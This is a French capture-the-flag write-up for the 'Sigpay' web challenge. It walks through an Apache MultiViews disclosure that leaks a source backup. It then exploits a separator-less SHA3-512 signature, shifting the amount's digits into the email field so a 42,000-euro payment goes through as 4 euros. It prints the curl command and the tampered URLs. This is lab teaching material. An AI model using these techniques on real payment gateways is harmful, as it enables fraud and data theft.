> Name: Sigpay
> 
> Category:  Web
> 
> Difficulty: Easy/Medium
> 
> Description: 
> *NFTs are so popular right now that everyone wants to be in it. Even charities...*
>
> *For each donator, the "Retro Community" claims to offer a unique NFT. Because they are having so much success, they plan on releasing the ultime NFT very soon.*
>  
> *You need that Secret NFT, by any means. Can you get it before anyone else ?*

Sur ce challenge, on a deux sites distincts :
- Le site de donation : http://donate.retro.nft:40080/
- Le site de paiement tiers (3rd Party) : http://payment-gateway.retro.nft.easy4pay.money:40080/

Le but est d'acheter le NFT à 42 000 euros.

![donate retro nft_40080_ (1)](https://github.com/pun-private/writeup-barbhack2023-web/assets/27222105/4565e63a-fcf7-4f3a-8f22-09097bb410e4)

![payment-gateway retro nft easy4pay money_40080__Amount=20 TransactionID=1089d466-8d27-4be5-960d-10603d264401 UserEmail=a@a com Signature=0bf07955d8e0475ac81728abe697c2e87d3ed57280265c1617aa21c6f9ad58c04361d03eef7ef](https://github.com/pun-private/writeup-barbhack2023-web/assets/27222105/47986731-672a-4531-9348-d743f59cd713)

Lorsqu'on ajoute au panier un NFT du site principal, une signature est générée et envoyée au site de paiement. Si on altère n'importe quel paramètre, on a le message :

> *** Signature could not verified.**

En regardant le site principal, on voit qu'il y a un CHANGELOG tout en bas :

```
# Changelog
All notable changes to this project will be documented in this file.

The format is based on [Keep a Changelog](https://keepachangelog.com/en/1.0.0/),
and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0.html).

## [Unreleased]

## [0.4.0] - 2022-01-03
### Changed
- Multi-Language "Terms of Service" files are served using Apache Configuration only :

    <Directory /var/www/html/files>
        Options -Indexes +FollowSymLinks +MultiViews
        MultiviewsMatch Any
    </Directory>

## [0.3.1] - 2022-12-09
### Changed
- New "Disallow" rule in `robots.txt` in case backup files are indexable.

## [0.3.0] - 2021-12-08
### Added
- Backup scripts

## [0.2.0] - 2021-12-03
### Added
- Payments are now handled by an external gateway.

### Security
- Switched to SHA3-512 for transactions signatures.

## [0.1.0] - 2021-11-10
### Added
- Initial release.
```

Deux choses sont intéressantes :
1. Le Multiview est activé sur la configuration Apache (https://httpd.apache.org/docs/2.4/en/content-negotiation.htmlhttps://httpd.apache.org/docs/2.4/en/content-negotiation.html)
2. Il y aurait des backups (on le voit aussi dans le chemin `/files/backup` dans `robots.txt`)

En allant sur http://donate.retro.nft:40080/files/backup, on a journal d'information sur les backups :

```
[2021-12-26 01:00:00] Logfile="backup.txt.log_20211226.56872"

[2021-12-26 01:00:00] Deleting previous backups : rm backup.*

[2021-12-26 01:00:00] Archiving "donations_all.csv" file...
[2021-12-26 01:00:03] Backup "backup.tar<redacted>_csv" created.

[2021-12-26 01:00:03] Archiving "donate" source code folder...
[2021-12-26 01:00:12] Backup "backup.tar<redacted>_src" created.

[2021-12-26 01:00:12] Script finished with 0 error(s).
```

Il y a trois fichiers backup* qui sont créés :
- `backup.txt.log_20211226.56872` => c'est le journal qu'on lit actuellement
- `backup.tar<redacted>_csv` => c'est un backup de toutes les donations
- `backup.tar<redacted>_src` => c'est le **backup du code source** ! 

Comme le multiview est activé, on peut essayer d'aller sur `/files/backup.tar` qui nous récupère bien une archive mais c'est celle des donations, pas du code source. 

En se documentant sur ce qu'est le multiview, on comprend que le serveur nous retourne ce qu'on lui demande comme type de fichier (langue, type, etc)... mais s'il ne sait pas ce qu'on veut, il nous retourne la liste des fichiers candidats possibles !

```
$> curl -H 'Accept: WhatDoYouWant/IDontKnow' http://donate.retro.nft:40080/files/backup

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>406 Not Acceptable</title>
</head><body>
<h1>Not Acceptable</h1>
<p>An appropriate representation of the requested resource could not be found on this server.</p>
Available variants:
<ul>
<li><a href="backup.tar.584a7d5ba722121e729c049e9bc91932_src">backup.tar.584a7d5ba722121e729c049e9bc91932_src</a> , type application/x-tar</li>
<li><a href="backup.tar.f3d62d4f5c5a9d43e4e1d1d623950b7c_csv">backup.tar.f3d62d4f5c5a9d43e4e1d1d623950b7c_csv</a> , type application/x-tar</li>
<li><a href="backup.txt.log_20211226.56872">backup.txt.log_20211226.56872</a> , type text/plain</li>
</ul>
<hr>
<address>Apache/2.4.56 (Debian) Server at donate.retro.nft Port 40080</address>
</body></html>
```

On a désormais le nom complet du backup des sources qu'on peut télécharger :
http://donate.retro.nft:40080/files/backup.tar.584a7d5ba722121e729c049e9bc91932_src

Dans la classe Donation, on voit comment la génération de signature pour le paiement est faite :

```php
    static public function generateSignature($transaction_id, $amount, $user_email) {

        $raw_string = "{$transaction_id}{$amount}{$user_email}" . SIGNATURE_SALT;
        return hash('sha3-512', $raw_string); // GO STRONG OR GO HOME !
        
    }
```

Sur le site du paiement, la signature est généré de la même façon ce qui permet de s'assurer de l'intégrité des paramètres qui lui sont envoyés

```
Amount=20&TransactionID=5e89b96d-dd2e-4d14-9984-b249d4c74a85&UserEmail=a@a.com&Signature=f4dd6d1f9c6221806c6b770783afdf3b512c2bdaf509fbd05a3818be137a96592e9c9dd16ee66eefa9cda0ae287bf6eca2ec2054606d9aba5be669f4ccdb0cc4
```

En s'intéressant plus à cette fonction, on voit que les valeurs sans tout simplement concaténés sans séparateur avec un `SIGNATURE_SALT` qu'on ne connait pas. Imaginons qu'on a les paramètres suivants :

```
transaction_id: 12345-XYZ
amount: 42
email: pouet@prout.com

raw_string = 12345-XYZ42pouet@prout.com<secret_salt>
```

Et si maintenant la somme vaut `4` et l'email `2pouet@prout.com` ?

```
raw_string = 12345-XYZ42pouet@prout.com<secret_salt>
```

Cela donne exactement la même signature !

Il ne reste plus qu'à générer une donation de 42000 euros sur le site donate :

```
http://donate.retro.nft:40080/checkout?Amount=42000&UserEmail=a@a.com
```

Et modifier la somme à `4` et l'email à `2000a@a.com` sur le site de paiement :

```
http://payment-gateway.retro.nft.easy4pay.money:40080/?Amount=4&TransactionID=929d84a4-03f5-4465-85b7-c54799ca4688&UserEmail=2000a@a.com&Signature=74e832721da97b3032bc406ec0a99db965f32039119a3f2c52ce4d5c358150b383ebb37fa82b0ce49cb6722e4f17ac80cb1de004911ad70cfa9d09fe854f373e
```

On paie et on est redirigé vers le flag =)

![Pasted image 20230731113652](https://github.com/pun-private/writeup-barbhack2023-web/assets/27222105/a947bf81-9f6d-49aa-87a1-ebfa4f036d7c)
